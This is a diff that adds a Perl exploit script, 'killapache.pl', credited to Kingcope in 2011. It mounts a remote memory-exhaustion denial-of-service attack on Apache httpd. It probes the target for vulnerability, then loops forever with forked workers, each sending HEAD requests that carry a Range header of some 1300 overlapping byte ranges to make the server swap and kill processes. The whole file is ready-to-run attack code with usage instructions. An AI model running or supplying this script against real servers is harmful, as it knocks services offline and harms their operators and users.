@@ -1,0 +1,84 @@
+#Apache httpd Remote Denial of Service (memory exhaustion)
+#By Kingcope
+#Year 2011
+#
+# Will result in swapping memory to filesystem on the remote side
+# plus killing of processes when running out of swap space.
+# Remote System becomes unstable.
+#
+
+use IO::Socket;
+use Parallel::ForkManager;
+
+sub usage {
+	print "Apache Remote Denial of Service (memory exhaustion)\n";
+	print "by Kingcope\n";
+	print "usage: perl killapache.pl <host> [numforks]\n";
+	print "example: perl killapache.pl www.example.com 50\n";
+}
+
+sub killapache {
+print "ATTACKING $ARGV[0] [using $numforks forks]\n";
+	
+$pm = new Parallel::ForkManager($numforks);
+
+$|=1;
+srand(time());
+$p = "";
+for ($k=0;$k<1300;$k++) {
+	$p .= ",5-$k";
+}
+
+for ($k=0;$k<$numforks;$k++) {
+my $pid = $pm->start and next; 	
+	
+$x = "";
+my $sock = IO::Socket::INET->new(PeerAddr => $ARGV[0],
+                                 PeerPort => "80",
+                     			 Proto    => 'tcp');
+
+$p = "HEAD / HTTP/1.1\r\nHost: $ARGV[0]\r\nRange:bytes=0-$p\r\nAccept-Encoding: gzip\r\nConnection: close\r\n\r\n";
+print $sock $p;
+
+while(<$sock>) {
+}
+ $pm->finish;
+}
+$pm->wait_all_children;
+print ":pPpPpppPpPPppPpppPp\n";
+}
+
+sub testapache {
+my $sock = IO::Socket::INET->new(PeerAddr => $ARGV[0],
+                                 PeerPort => "80",
+                     			 Proto    => 'tcp');
+
+$p = "HEAD / HTTP/1.1\r\nHost: $ARGV[0]\r\nRange:bytes=0-$p\r\nAccept-Encoding: gzip\r\nConnection: close\r\n\r\n";
+print $sock $p;
+
+$x = <$sock>;
+if ($x =~ /Partial/) {
+	print "host seems vuln\n";
+	return 1;	
+} else {
+	return 0;	
+}
+}
+
+if ($#ARGV < 0) {
+	usage;
+	exit;	
+}
+
+if ($#ARGV > 1) {
+	$numforks = $ARGV[1];
+} else {$numforks = 50;}
+
+$v = testapache();
+if ($v == 0) {
+	print "Host does not seem vulnerable\n";
+	exit;	
+}
+while(1) {
+killapache();
+}
